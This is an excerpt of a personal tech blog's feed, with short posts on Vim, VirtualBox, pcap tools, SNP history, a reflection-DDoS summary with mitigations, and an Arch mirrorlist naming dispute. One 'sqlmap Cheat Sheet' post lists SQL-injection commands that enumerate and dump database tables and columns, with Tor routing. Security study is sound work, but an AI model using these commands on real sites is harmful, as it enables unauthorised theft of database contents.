(此為作者後來修正，原先沒扣掉封包 Header 的平均大小約為 440 bytes)&lt;br /&gt;
攻擊者透過 botnet 並將 source ip 偽造成 victim ip&lt;br /&gt;
向網路上運行此服務的 Public MS SQL Server 發送此種封包&lt;br /&gt;
導致這些 Server 成為 Amplifier&lt;br /&gt;
間接對 victim 造成 DDoS 攻擊  &lt;/p&gt;
&lt;p&gt;而將此 Resolution Service 關閉會影響一些正常的服務&lt;br /&gt;
所以作者建議不要將有運行此 Service 的 MS SQL Server&lt;br /&gt;
放在 Public Network  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The behavior exploited in this reflection attack is a key component of the functioning of MS SQL Server 2000 and later.&lt;br /&gt;
Disabling this service is likely not to be an option.&lt;br /&gt;
It may be possible to limit the address space to which a server will respond to CLNT_BCAST_EX messages.&lt;br /&gt;
Most of all, though, owners of SQL Servers should question whether their servers should really be exposed to the internet in the first place.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;p&gt;有趣的是&lt;br /&gt;
作者提到在 MC-SQLR protocol documentation 中&lt;br /&gt;
有個關於安全的段落 &lt;a href="https://msdn.microsoft.com/en-us/library/cc219741.aspx"&gt;5.1 Security Considerations for Implementers&lt;/a&gt;&lt;br /&gt;
 寫著  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;"No security considerations are associated with the SQL Server Resolution Protocol"  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;他建議 M$ 該修改這部分了XD  &lt;/p&gt;</summary><category term="DDoS"></category><category term="MC-SQLR"></category><category term="Amplification Attack"></category><category term="Security"></category></entry><entry><title>DHC - REST/HTTP API Client</title><link href="https://blog.m157q.tw/posts/2015/01/21/dhc-rest-http-api-client/" rel="alternate"></link><published>2015-02-11T18:27:00+08:00</published><updated>2015-02-11T18:27:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-01-21:posts/2015/01/21/dhc-rest-http-api-client/</id><summary type="html">&lt;p&gt;&lt;a href="https://chrome.google.com/webstore/detail/dhc-resthttp-api-client/aejoelaoggembcahagimdiliamlcdmfm?hl=en"&gt;DHC - REST/HTTP API Client - Chrome Web Store&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;可以選 http/https 和不同的 method&lt;br /&gt;
然後自訂要送出的 request&lt;br /&gt;
send 之後會顯示 server 回傳內容的 source code&lt;br /&gt;
也會把該次 request 做記錄&lt;br /&gt;
方便之後修改&lt;br /&gt;
手動踹網站的時候蠻方便的  &lt;/p&gt;</summary><category term="Chrome"></category><category term="CTF"></category><category term="DHC"></category><category term="Security"></category></entry><entry><title>Find Malicious Website via Google Safe Browsing Diagnostic API</title><link href="https://blog.m157q.tw/posts/2015/01/14/find-malicious-website-via-google-safe-browsing-diagnostic-api/" rel="alternate"></link><published>2015-10-27T12:00:00+08:00</published><updated>2015-10-27T12:00:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-01-14:posts/2015/01/14/find-malicious-website-via-google-safe-browsing-diagnostic-api/</id><summary type="html">&lt;p&gt;One of my friends need to analyze the websites which are sentenced to be malicious website by the Google (Chrome safe browsing) for one of his security related course homeworks.&lt;br /&gt;
He told me that it's very hard to find such links, so I found this kind of solution for him.  &lt;/p&gt;
&lt;p&gt;&lt;img alt="The site ahead contains malware" src="/files/find-malicious-website-via-google-safe-browsing-diagnostic-api/the_site_ahead_contains_malware.png" /&gt;  &lt;/p&gt;
&lt;h3&gt;Use the Google Safe Browsing Diagnostic API&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://www.google.com/safebrowsing/diagnostic?site=Google.com"&gt;https://www.google.com/safebrowsing/diagnostic?site=Google.com&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Change the value of the &lt;code&gt;site&lt;/code&gt; to some portal site such as Google, Yahoo, ...  &lt;/li&gt;
&lt;li&gt;Check the result if it has &lt;code&gt;Malicious software is hosted on 276 domain(s), including ...&lt;/code&gt; like the following pic  &lt;/li&gt;
&lt;li&gt;Try those urls to see if Google Safe Browsing diagnose it as malicious urls  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt="Safe Browsing" src="/files/find-malicious-website-via-google-safe-browsing-diagnostic-api/safe_browsing.png" /&gt;  &lt;/p&gt;
&lt;h3&gt;The result of &lt;a href="http://24corp-shop.com/"&gt;http://24corp-shop.com/&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;&lt;img alt="24corp shop" src="/files/find-malicious-website-via-google-safe-browsing-diagnostic-api/24corp_shop.png" /&gt;  &lt;/p&gt;
&lt;h3&gt;NOTICE&lt;/h3&gt;
&lt;p&gt;Sometimes you won't see the "Security Error" message because the result shows the record in last 90 days.&lt;br /&gt;
When you access the website, the malicious software maybe already be removed from that site.  &lt;/p&gt;</summary><category term="Malicious Website"></category><category term="Safe Browsing"></category><category term="Security"></category></entry><entry><title>Converting tabs to spaces in Vim</title><link href="https://blog.m157q.tw/posts/2014/12/09/converting-tabs-to-spaces-in-vim/" rel="alternate"></link><published>2015-10-28T13:41:00+08:00</published><updated>2015-10-28T13:41:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-12-09:posts/2014/12/09/converting-tabs-to-spaces-in-vim/</id><summary type="html">&lt;h2&gt;Convert tabs to spaces&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="k"&gt;retab&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Set the 1 tab to be expanded to 4 spaces&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="k"&gt;set&lt;/span&gt; &lt;span class="nb"&gt;tabstop&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt; &lt;span class="nb"&gt;shiftwidth&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt; &lt;span class="nb"&gt;expandtab&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Comments below have some useful tips for some specail cases (like Makefile)&lt;/h2&gt;
&lt;p&gt;&lt;img alt="Comment 1" src="/files/converting-tabs-to-spaces-in-vim/comments_1.png" /&gt;  &lt;/p&gt;
&lt;p&gt;&lt;img alt="Comment 2" src="/files/converting-tabs-to-spaces-in-vim/comments_2.png" /&gt;  &lt;/p&gt;
&lt;p&gt;&lt;img alt="Comment 3" src="/files/converting-tabs-to-spaces-in-vim/comments_3.png" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Reference&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://vim.wikia.com/wiki/Converting_tabs_to_spaces"&gt;Converting tabs to spaces - Vim Tips Wiki&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="CLI"></category><category term="Vim"></category><category term="Makefile"></category></entry><entry><title>percol - interactive pipe in shell</title><link href="https://blog.m157q.tw/posts/2014/12/04/percol-interactive-pipe-in-shell/" rel="alternate"></link><published>2015-10-28T13:48:00+08:00</published><updated>2015-10-28T13:48:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-12-04:posts/2014/12/04/percol-interactive-pipe-in-shell/</id><summary type="html">&lt;h2&gt;&lt;a href="https://github.com/mooz/percol"&gt;mooz/percol · GitHub&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Just like &lt;code&gt;less&lt;/code&gt; + &lt;code&gt;grep&lt;/code&gt; (in time) + &lt;code&gt;echo&lt;/code&gt; (the result) to me.&lt;br /&gt;
But the instant query filter maybe useful in some cases.  &lt;/p&gt;
&lt;h3&gt;Installation&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo pip2 install percol  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Examples&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;$ percol $file&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ ps aux | percol&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ git checkout $(git branch | percol)&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="CLI"></category><category term="percol"></category><category term="Python"></category><category term="pip"></category></entry><entry><title>Boot LiveUSB in VirtualBox 4.3.18</title><link href="https://blog.m157q.tw/posts/2014/12/04/boot-liveusb-in-virtualbox-4-3-18/" rel="alternate"></link><published>2015-10-28T14:36:00+08:00</published><updated>2015-10-28T14:36:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-12-04:posts/2014/12/04/boot-liveusb-in-virtualbox-4-3-18/</id><summary type="html">&lt;h2&gt;Steps&lt;/h2&gt;
&lt;h3&gt;1.&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo chown m157q /dev/disk1  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;2.&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ VBoxManage internalcommands createrawvmdk -filename ~/VirtualBox&lt;span class="se"&gt;\ &lt;/span&gt;VMs/win7_test.vmdk -rawdisk /dev/disk1  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;3.&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Create New Machine in VirtualBox and select the generated .vmdk file as the hard drive.  &lt;ul&gt;
&lt;li&gt;Use an existing virtual hard drive file while addding the Hard drive.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;4.&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Boot the virtual machine.  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.xuite.net/yh96301/blog/64131045-VirtualBox+4.3.4%E4%BD%BF%E7%94%A8USB%E9%9A%A8%E8%BA%AB%E7%A2%9F%E9%96%8B%E6%A9%9F"&gt;VirtualBox 4.3.4使用USB隨身碟開機 @ 軟體使用教學 :: 隨意窩 Xuite日誌&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://gordon168.tw/?p=324"&gt;VirtualBox設定由USB隨身碟開機 « 高登工作室&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://forums.virtualbox.org/viewtopic.php?t=9223"&gt;virtualbox.org • View topic - Using a raw hard disk on Mac OS X&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://forums.virtualbox.org/viewtopic.php?f=8&amp;amp;p=99406"&gt;virtualbox.org • View topic - VERR_ACCESS_DENIED&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="VirtualBox"></category><category term="LiveUSB"></category><category term="sysadmin"></category></entry><entry><title>sqlmap Cheat Sheet</title><link href="https://blog.m157q.tw/posts/2014/12/01/sqlmap-cheat-sheet/" rel="alternate"></link><published>2014-12-01T05:04:00+08:00</published><updated>2014-12-01T05:04:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-12-01:posts/2014/12/01/sqlmap-cheat-sheet/</id><summary type="html">&lt;h1&gt;Usage&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;$ sqlmap -u ${url}&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ sqlmap -u ${url} --dbs&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ sqlmap -u ${url} -D ${database} --tables&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ sqlmap -u ${url} -D ${database} -T ${table} --columns&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ sqlmap -u ${url} -D ${database} -T ${table} -C ${col1},${col2} --dump&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Options&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;--tor --tor-type=SOCKS5&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;References&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.nigesb.com/sqlmap-common-usage-and-examples.html"&gt;sqlmap注入常见用法一条龙&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage"&gt;sqlmap - Usage&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://oldmanlab.blogspot.tw/2012/03/sqlmap-tutorial-you-are-just.html"&gt;An Old man lab0ratory: Sqlmap tutorial - you are just unavoidable&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage"&gt;Usage · sqlmapproject/sqlmap Wiki · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="SQL Injection"></category><category term="sqlmap"></category><category term="Security"></category></entry><entry><title>Use find, grep, xargs to Rename Multiple Files</title><link href="https://blog.m157q.tw/posts/2014/11/10/use-find-grep-xargs-to-rename-multiple-files/" rel="alternate"></link><published>2015-10-28T13:51:00+08:00</published><updated>2015-10-28T13:51:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-11-10:posts/2014/11/10/use-find-grep-xargs-to-rename-multiple-files/</id><summary type="html">&lt;p&gt;Recursively find filenames ends up with &lt;code&gt;.vh&lt;/code&gt; from pwd directory and change their names from &lt;code&gt;*.vh&lt;/code&gt; to &lt;code&gt;*.vhd&lt;/code&gt;  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;find &lt;span class="p"&gt;|&lt;/span&gt; grep .vh$ &lt;span class="p"&gt;|&lt;/span&gt; xargs -I &lt;span class="o"&gt;{}&lt;/span&gt;.vh mv &lt;span class="o"&gt;{}&lt;/span&gt;.vh &lt;span class="o"&gt;{}&lt;/span&gt;.vhd  
&lt;/pre&gt;&lt;/div&gt;


&lt;blockquote&gt;
&lt;p&gt;This Only works with BSD &lt;code&gt;xargs&lt;/code&gt; !!  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/10212192/how-to-grep-for-a-filename-instead-of-the-contents-of-a-file"&gt;http://stackoverflow.com/questions/10212192/how-to-grep-for-a-filename-instead-of-the-contents-of-a-file&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://viewsby.wordpress.com/2012/12/04/find-mvrename-with-xargs-example/"&gt;http://viewsby.wordpress.com/2012/12/04/find-mvrename-with-xargs-example/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="CLI"></category><category term="find"></category><category term="grep"></category><category term="xargs"></category><category term="mv"></category><category term="rename"></category></entry><entry><title>VirtualBox Guest additions upgrade: install_x11_startup_app: no script given</title><link href="https://blog.m157q.tw/posts/2014/11/10/virtualbox-guest-additions-upgrade-install_x11_startup_app-no-script-given/" rel="alternate"></link><published>2015-10-28T14:41:00+08:00</published><updated>2015-10-28T14:41:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-11-10:posts/2014/11/10/virtualbox-guest-additions-upgrade-install_x11_startup_app-no-script-given/</id><summary type="html">&lt;p&gt;I encountered this problem while I was doing the upgrade for the guest additions of VirtualBox.  &lt;/p&gt;
&lt;h3&gt;Guest OS: Ubuntu 14.04&lt;/h3&gt;
&lt;p&gt;Remove the following symlinks before you install the new version of the Guest addtions  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;# rm /usr/lib/x86_64-linux-gnu/VBoxGuestAdditions&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;# rm /usr/lib/VBoxGuestAdditions&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;# rm /usr/share/VBoxGuestAdditions&lt;/code&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Reference&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://gallinar.blogspot.tw/2012/07/virtualbox-guest-additions-upgrade.html"&gt;A bozo's blog: VirtualBox Guest additions upgrade: install_x11_startup_app: no script given&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="VirtualBox"></category><category term="Guest Additions"></category><category term="install_x11_startup_app"></category><category term="sysadmin"></category></entry><entry><title>Print pcap file in friendly format</title><link href="https://blog.m157q.tw/posts/2014/11/06/print-pcap-file-in-friendly-format/" rel="alternate"></link><published>2015-10-28T13:55:00+08:00</published><updated>2015-10-28T13:55:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-11-06:posts/2014/11/06/print-pcap-file-in-friendly-format/</id><summary type="html">&lt;h2&gt;Usage&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href="https://www.wireshark.org/"&gt;Wireshark&lt;/a&gt; (GUI)  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.tcpdump.org/"&gt;tcpdump&lt;/a&gt; (CLI)  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;$ tcpdump -qns 0 -X -r ${pcap_file}&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ tcpdump -qns 0 -A -r ${pcap_file}&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://tcpick.sourceforge.net/"&gt;tcpick&lt;/a&gt; (CLI)  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;$ tcpick -C -yP -r ${pcap_file}&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://tcpxtract.sourceforge.net/"&gt;tcpxtract&lt;/a&gt; (CLI)  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;$ tcpxtract -f ${pcap_file} -o {output_path}&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://serverfault.com/questions/38626/how-can-i-read-pcap-files-in-a-friendly-format"&gt;serverfault - How can I read pcap files in a friendly format?&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://sickbits.net/other/pcapworksheet.txt"&gt;Hack3rcon^3: A PCAP Workshop&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="CLI"></category><category term="WireShark"></category><category term="pcap"></category><category term="tcpdump"></category><category term="tcpick"></category><category term="tcpxtract"></category></entry><entry><title>SNP (Secure Network Protocol)</title><link href="https://blog.m157q.tw/posts/2014/11/03/snp-secure-network-protocol/" rel="alternate"></link><published>2015-10-20T14:07:00+08:00</published><updated>2015-10-20T14:07:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-11-03:posts/2014/11/03/snp-secure-network-protocol/</id><summary type="html">&lt;p&gt;交大 DSNS Lab 開發&lt;br /&gt;
有申請專利&lt;br /&gt;
看起來就是個有加密的 telnet (?)&lt;br /&gt;
聽說後來沒人維護，就被 SSH 幹掉了&lt;br /&gt;
又知道了奇怪的歷史&lt;br /&gt;
以前的人都好強啊  &lt;/p&gt;
&lt;p&gt;&lt;a href="http://toget.pchome.com.tw/category/network/11685.html"&gt;SNP telnet for Windows 給你安全的 telnet 環境 - PChome 下載&lt;/a&gt;&lt;br /&gt;
這邊還有相關軟體可以下載得到(?)  &lt;/p&gt;
&lt;p&gt;Quote from &lt;a href="http://www.ascc.sinica.edu.tw/nl/88/1517/02.txt"&gt;《網路與通訊》 淺談網路安全與防護&lt;/a&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;3.SNP：&lt;br /&gt;
由交通大學資訊工程學系分散系統與網路安全實驗室所研發出來的一套新式網路安全系統&lt;br /&gt;
（Security  Network Protocols， 簡稱SNP）。&lt;br /&gt;
此套系統包含了多項安全的應用程式，&lt;br /&gt;
如安全電子郵件（Certified  Secure E-mail System，簡稱CS-Mail）、&lt;br /&gt;
身分認證中心（Certificate Authority）及&lt;br /&gt;
網路監聽系統（Network Monitor Systems）等&lt;br /&gt;
交大係冀望藉由此一系統的功能，達到整合式的安全通訊網路環境。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Quote from &lt;a href="https://ir.nctu.edu.tw/bitstream/11536/6497/1/000272742700008.pdf"&gt;https://ir.nctu.edu.tw/bitstream/11536/6497/1/000272742700008.pdf&lt;/a&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Among these protocols, Secure Network Protocol (SNP)(Shieh et al., 1999)&lt;br /&gt;
is one of the few protocols that has real deployment for years.&lt;br /&gt;
SNP is a symmetric-key based protocol providing an efficient way for both intra- and inter- domain authentication.&lt;br /&gt;
Compared  to  Kerberos, fewer messages are required in SNP to authenticate client identity.&lt;br /&gt;
For intra-domain authentication,&lt;br /&gt;
SNP takes four messages to authenticate client identity and one more optional message for mutually authenticating the server.&lt;br /&gt;
For inter-domain authentication, it takes seven messages for initial authentication,&lt;br /&gt;
regardless of the number of hops between the visited and home domains.&lt;br /&gt;
Only two messages are required for subsequent authentication when requesting the same service.&lt;br /&gt;
To simplify the design, SNP replaces timestamps with nonces, reducing the need for time servers.&lt;br /&gt;
For faster authentication, a master key is shared by the authentication server (AS) and the service servers (S).&lt;br /&gt;
The unchanged master keys can make the system vulnerable to various attacks.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Quote from &lt;a href="https://comm.ntu.edu.tw/2010UKworkshop/NSP9.htm"&gt;Prof. Shiuhpyng Shieh&lt;/a&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;He was the designer of SNP (Secure Network Protocol), which was a very popular security software package.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;這篇疑似是 Secure Network Protocol 的論文&lt;br /&gt;
&lt;a href="http://dsns.cs.nctu.edu.tw/ssp/paper/50.An%20Authentication%20and%20Key%20Distribution%20System%20for%20Open%20Network%20Systems.pdf"&gt;http://dsns.cs.nctu.edu.tw/ssp/paper/50.An%20Authentication%20and%20Key%20Distribution%20System%20for%20Open%20Network%20Systems.pdf&lt;/a&gt;  &lt;/p&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://dsns.cs.nctu.edu.tw/ssp/paper/50.An%20Authentication%20and%20Key%20Distribution%20System%20for%20Open%20Network%20Systems.pdf"&gt;http://dsns.cs.nctu.edu.tw/ssp/paper/50.An%20Authentication%20and%20Key%20Distribution%20System%20for%20Open%20Network%20Systems.pdf&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://ir.nctu.edu.tw/bitstream/11536/6497/1/000272742700008.pdf"&gt;https://ir.nctu.edu.tw/bitstream/11536/6497/1/000272742700008.pdf&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://comm.ntu.edu.tw/2010UKworkshop/NSP9.htm"&gt;Prof. Shiuhpyng Shieh&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.slidefinder.net/c/conventional_encryption/32524394"&gt;netsec-intro-2nd&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://content.edu.tw/senior/computer/ks_ks/pro/new8.htm"&gt;BSD簡介 - SNP &amp;amp; ptelnet&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://toget.pchome.com.tw/category/network/11685.html"&gt;SNP telnet for Windows 給你安全的 telnet 環境 - PChome 下載&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;(dead) &lt;a href="http://fanqiang.chinaunix.net/a1/b2/20020308/060200125_b.html"&gt;FreeBSD SNP 1.裝設SNP&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;(backup) &lt;a href="https://www.evernote.com/shard/s351/sh/18196c4c-a29c-4b39-a114-78991a799f26/908d2e28eaaced87bc50f9bd05b6dfd3"&gt;[備份] 安裝 SNP 通訊全程加密&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;(dead) &lt;a href="http://www.ascc.sinica.edu.tw/nl/88/1517/02.txt"&gt;《網路與通訊》 淺談網路安全與防護&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;(backup) &lt;a href="https://www.evernote.com/shard/s351/sh/889e26f1-362e-4785-b24a-1c5a71b9e2a3/a0a3c0e63b30a4c442d232fb34b37fca"&gt;[備份] 《網路與通訊》淺談網路安全與防護&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="SNP"></category><category term="NCTU"></category><category term="DSNS"></category></entry><entry><title>pacman mirrorlist - Taiwan vs. Taiwan (Province of China)</title><link href="https://blog.m157q.tw/posts/2014/10/29/pacman-mirrorlist-taiwan-vs-taiwan-province-of-china/" rel="alternate"></link><published>2015-10-27T12:55:00+08:00</published><updated>2015-10-27T12:55:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-10-29:posts/2014/10/29/pacman-mirrorlist-taiwan-vs-taiwan-province-of-china/</id><summary type="html">&lt;p&gt;這是個有點久以前的故事了  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://projects.archlinux.org/svntogit/packages.git/commit/trunk?h=packages/pacman-mirrorlist&amp;amp;id=4ebeb6161b4f178b9f3105d47a2c408bc1dd9547"&gt;2012/06/26 的 pacman mirrorlist commit&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;把 Taiwan 改成了 Taiwan (Province of China)  &lt;/p&gt;
&lt;p&gt;然後就有台灣人在 Arch Bugs Report 發起一則 Bug Report  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://bugs.archlinux.org/task/30444"&gt;FS#30444 - Download Page uses Taiwan's name as “Taiwan, Province of China”&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;要求把名字改回 Taiwan  &lt;/p&gt;
&lt;p&gt;陸陸續續也有人去發 Bug Report 要求正名  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://bugs.archlinux.org/task/35586"&gt;FS#35586 - Please change "Taiwan, province of china" to "Taiwan in pacman-mirrorlist&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://bugs.archlinux.org/task/35757"&gt;FS#35757 - Listing for Taiwan&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://bugs.archlinux.org/task/37973"&gt;FS#37973 - Taiwan is not a province of China...&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;然後之後就被 Admin 拿 &lt;a href="http://en.wikipedia.org/wiki/ISO_3166"&gt;ISO 3166&lt;/a&gt; 打槍  &lt;/p&gt;
&lt;p&gt;&lt;img alt="ISO 3166" src="/files/pacman-mirrorlist-taiwan-vs-taiwan-province-of-china/iso_3166.png" /&gt;  &lt;/p&gt;
&lt;p&gt;把相關所有 Report 都 close 掉  &lt;/p&gt;
&lt;p&gt;直到剛剛&lt;br /&gt;
下個 &lt;code&gt;sudo pacman -Syu&lt;/code&gt; 更新 Arch，再用 &lt;code&gt;sudo pacdiff&lt;/code&gt; 更新設定檔的時候&lt;br /&gt;
發現從 Taiwan (Province of China) 改回 Taiwan 了  &lt;/p&gt;
&lt;p&gt;&lt;img alt="Change Back to Taiwan" src="/files/pacman-mirrorlist-taiwan-vs-taiwan-province-of-china/change_back_to_taiwan.png" /&gt;  &lt;/p&gt;
&lt;p&gt;覺得有點訝異和好奇&lt;br /&gt;
查了下官網也沒啥相關公告&lt;br /&gt;
然後去翻了一下&lt;a href="https://projects.archlinux.org/svntogit/packages.git/commit/?h=packages/pacman-mirrorlist&amp;amp;id=6438bca958924f781d166c2a473abecd3db54670"&gt;最新的 commit log&lt;/a&gt;&lt;br /&gt;
和舊的比較一下&lt;br /&gt;
發現是同一個 committer  &lt;/p&gt;
&lt;p&gt;&lt;img alt="Same Committer" src="/files/pacman-mirrorlist-taiwan-vs-taiwan-province-of-china/same_committer.png" /&gt;&lt;br /&gt;
再去看了一下 &lt;a href="https://www.archlinux.org/download/"&gt;Arch Linux 官網的 Download Page&lt;/a&gt;&lt;br /&gt;
台灣的部分還真的改回來變成 Taiwan 了  &lt;/p&gt;
&lt;p&gt;&lt;img alt="Taiwan" src="/files/pacman-mirrorlist-taiwan-vs-taiwan-province-of-china/taiwan.png" /&gt;  &lt;/p&gt;
&lt;p&gt;於是又去找了一下 &lt;a href="http://webcache.googleusercontent.com/search?q=cache:nsRN9P-SvTgJ:https://www.archlinux.org/download/+&amp;amp;cd=1&amp;amp;hl=en&amp;amp;ct=clnk&amp;amp;gl=tw"&gt;Google Cache&lt;/a&gt; 確認一下是不是最近發生的事&lt;br /&gt;
發現還是舊的 Taiwan (Province of China)  &lt;/p&gt;
